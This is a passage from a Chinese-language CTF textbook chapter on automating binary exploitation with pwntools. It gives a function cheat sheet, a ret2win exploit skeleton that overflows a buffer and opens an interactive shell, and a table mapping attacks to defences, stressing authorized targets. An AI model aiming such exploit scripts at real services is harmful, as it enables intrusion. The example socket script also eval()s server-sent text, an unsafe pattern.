pwntools 自動化:把工具串成一條流水線

你可能注意到了:從第一個 pwntools 腳本開始,我們就在「自動」跟題目互動—— 而不是手動一個一個位元組地敲。這不是偷懶,而是 Pwn 的必要技能。 為什麼?因為真正的 Pwn 題往往是跑在遠端伺服器的網路服務:它會先印一段提示、 要你回一個值、再印下一段……如果還牽涉到「洩漏位址 → 即時算出新位址 → 送第二段 payload」這種需要 動態計算的互動,人手根本來不及、也算不準。你需要一個程式,替你一問一答。

這個需求,其實第 41 章那條 CTF 學習線更早就鋪墊過了:最一開始的自動化練習, 甚至不用 pwntools,光用 Python 標準庫的 socket 就能跟一個「會連續出數學題的伺服器」自動對答如流: 

# 自動化的雛形:用標準庫 socket 跟「連續出題」的服務一問一答
import socket, re

s = socket.create_connection(("127.0.0.1", 9000))
while True:
    line = s.recv(4096).decode()           # 收一行
    print(line)
    if "FLAG{" in line:                    # 拿到旗就收工
        print(re.search(r"FLAG\{[^}]*\}", line).group(0))
        break
    if "= ?" in line:                      # 看到 "12 + 7 = ?" 這種題目
        expr = line.split(":")[1].replace("= ?", "").strip()
        s.sendall((str(eval(expr)) + "\n").encode())   # 算出答案、送回去
s.close()

看懂這個「收 → 判斷 → 算 → 送」的迴圈,你就懂了所有 Pwn 自動化的骨架。pwntools 只是把這套流程 包裝得更順手、又補上 Pwn 專用的「打包位址」工具。下面這張小抄,是你 90% 時間會用到的全部:

pwntools 函式它做什麼
process("./vuln")在本機啟動題目程式(練習、找 offset 時用)。
remote("host", port)連到遠端(獲授權的)題目服務——跟 process 介面一模一樣,改一行就能從本機切到遠端。
io.recvuntil(b"...")一直收,直到看到指定字串為止(用來「等題目把提示印完」)。
io.recvline()收一整行(常用來接「洩漏出來的位址」那一行)。
io.sendline(payload)送出 payload,並自動補上換行。(io.send 則不補換行。)
p64(x) / p32(x)把整數 x 打包成 8 / 4 bytes 的小端字串(寫位址必用)。
u64(b) / u32(b)反向:把收回來的位元組還原成整數(讀洩漏的位址必用)。
flat(a, b, ...)把一串「墊片 + 位址 + 位址…」自動接成完整 payload(整數會自動 p64)。
io.interactive()把控制權交給你,手動操作拿到的 shell(例如 cat flag.txt)。

一個典型的 pwntools exploit,結構永遠是這幾段:① 載入 ELF / 連上題目 → ② 收提示 (recvuntil)→ ③ 組 payload(flat + p64)→ ④ 送出(sendline) →(若需要)⑤ 收洩漏、用 u64 還原、算新位址、再送一發 → ⑥ interactive 收割。 你前面看到的 ret2win 與 ret2libc 腳本,都是這個骨架的不同填法。

💡
同一份腳本,本機開發、遠端收割

pwntools 最體貼的設計,是 process() 和 remote() 的介面完全相同。 所以你的工作流是:在本機用 process("./vuln") 反覆除錯、找 offset、調 payload; 一切就緒後,只把那一行改成 remote("授權的題目主機", 31337),同一份腳本就能去打獲得授權的遠端題目。 再強調一次:remote 的對象,只能是 CTF 主辦方明確提供給你練習的伺服器。

✏️ 練習 72.6 實作

一個(獲授權的)遠端題目,連上後會先印一行 Give me your payload:,然後讀你的輸入。 已知這是一支 No-PIE、No-canary 的 ret2win 程式,offset 為 40,win 位址為 0x4011d6。 請寫出 pwntools 腳本骨架,正確處理「等提示 → 送 payload」,並標出哪一行決定了「本機」或「遠端」。

看解答 
from pwn import *

# ↓↓↓ 這一行決定本機 / 遠端(介面相同,改這行即可) ↓↓↓
# io = process("./vuln")                 # 本機除錯時用
io = remote("授權的題目主機", 31337)      # 確認無誤後,打獲授權的遠端題

OFFSET = 40
win    = 0x4011d6

io.recvuntil(b"Give me your payload:")    # ① 等題目把提示印完,再送
payload = flat(b"A" * OFFSET, p64(win))   # ② 墊 40 + 蓋上 win(小端)
io.sendline(payload)                      # ③ 送出

io.interactive()                          # ④ 接管,讀出 FLAG{...}

重點:recvuntil 確保我們等到題目印完提示才送(否則可能搶在程式還沒準備好讀就送出); flat(...) 自動把 0x4011d6 這個整數 p64 成小端。 本機與遠端只差 process / remote 一行——這就是「本機開發、遠端收割」的威力。

防禦視角:每一個攻擊,都對著一條防線

走完這趟攻擊之旅,該把帽子翻回白色那一面了。這一章真正想教你的,從來不是「如何打人」, 而是「攻擊者會怎麼想,所以我該怎麼守」。把這一章的每一招,對回它的剋星—— 你會發現,它們整齊地呼應了第 36 章的每一條防禦原則:

你在本章學到的攻擊它利用的弱點對應的防禦(呼應第 36 章)
逆向找出寫死的密碼 / 旗把秘密放在使用者拿得到的二進位裡秘密與驗證留在伺服器端;別在用戶端藏鑰匙(混淆只能拖延)。
溢位蓋掉旁邊的變數gets / scanf("%s") / 無上限的 read邊界檢查:改用會帶長度上限的 fgets、snprintf、限定讀取量。
ret2win:蓋過返回位址連續溢位能搆到返回位址開啟 Stack Canary;同樣靠邊界檢查從源頭杜絕。
注入 shellcode 到堆疊堆疊可執行開啟 NX / DEP,讓資料區不可當程式碼跑。
寫死位址 / ret2libc / ROP記憶體佈局可預測開啟 ASLR + PIE,讓位址每次隨機。
洩漏位址打穿 ASLR程式有「吐出位址」的管道堵住資訊洩漏(別印出指標 / 位址);錯誤訊息對外沉默(第 36 章)。
拿到 shell 後 cat flag程式權限過大最小權限:程式別用 root 跑,即使被攻破也限縮損害。

看出這張表的弦外之音了嗎?每一道現代防護,都是某一個歷史攻擊逼出來的答案。 canary 是為了擋蓋返回位址、NX 是為了擋 shellcode、ASLR/PIE 是為了擋「寫死位址」。 而它們全部疊起來,就是第 36 章講的「縱深防禦」:一層被突破,還有下一層。 最徹底的那一層,則是從源頭——做好邊界檢查,或改用記憶體安全的語言,讓這整類漏洞根本無從發生。

🔑
理解攻擊,是為了更好地防禦

你現在不只是「聽說過」緩衝區溢位,而是親手算過 offset、親眼在 gdb 看過返回位址被蓋掉。 這份「具體」,正是防禦者最珍貴的直覺:當你寫下一個 read 時,你會本能地想到那 64 bytes 之後就是返回位址; 當你 code review 看到 gets 時,你會立刻起雞皮疙瘩。攻擊與防禦,從來不是兩種人,而是同一個工程師的兩種視角—— 這也是第 36 章那句「永遠假設輸入是惡意的」最深刻的註腳。

把這一章串起來

我們從「兩個動詞」出發——逆向是「讀懂」,Pwn 是「控制」——走完了 CTF 最硬核的兩條路:

  • 逆向工程:編譯是幾乎不可逆的門。用靜態分析(file / strings / objdump / Ghidra)讀劇本、用動態分析(gdb 斷點、看暫存器與記憶體)看現場; 破解 crackme 的關鍵,是知道把注意力放在 strcmp、判斷點與可疑運算上(呼應第 21 章的暫存器與機器碼)。
  • 記憶體與堆疊:行程記憶體分成 text / data / heap / stack;stack frame 裡有區域變數、存起來的 rbp、 以及返回位址。堆疊往低位址長、緩衝區往高位址寫,這個方向差讓溢位能搆到返回位址。x86-64 用小端, p64 / u64 替你處理(呼應第 24 章)。
  • 緩衝區溢位 I(ret2win):checksec 看防護 → cyclic 找 offset → 查 win 位址 → payload = b"A"*offset + p64(win) → pwntools 送出。它是 「資料越界 → 改寫返回位址 → 劫持執行」這條因果鏈的最小可運作版(呼應第 36 章)。
  • 緩衝區溢位 II(保護與 ret2libc):Canary 擋蓋返回位址、NX 擋 shellcode、ASLR/PIE 擋寫死位址; 當 NX 擋住 shellcode,改用 ret2libc——兩階段先洩漏位址打穿 ASLR、再呼叫 system("/bin/sh");把這招一般化,就是 ROP。
  • pwntools 自動化:「收 → 判斷 → 算 → 送」的迴圈。process(本機)/ remote(授權遠端) 介面相同;recvuntil / sendline 收送、p64 / u64 打包位址、flat 組 payload。
  • 防禦視角:每一個攻擊都對著一條防線;每一道防護都是某個歷史攻擊逼出來的答案。 最徹底的修法,永遠是源頭的邊界檢查與記憶體安全語言。

最後,把這一章開頭那條線再描一次:你學會的這一切,是為了守。在自己的程式裡聞出漏洞的味道、 在自架或獲授權的靶場裡安全地練習、在發現別人的漏洞時負責任地揭露——這是白帽的本分。 技術是中性的,讓它成為盾,而不是矛。
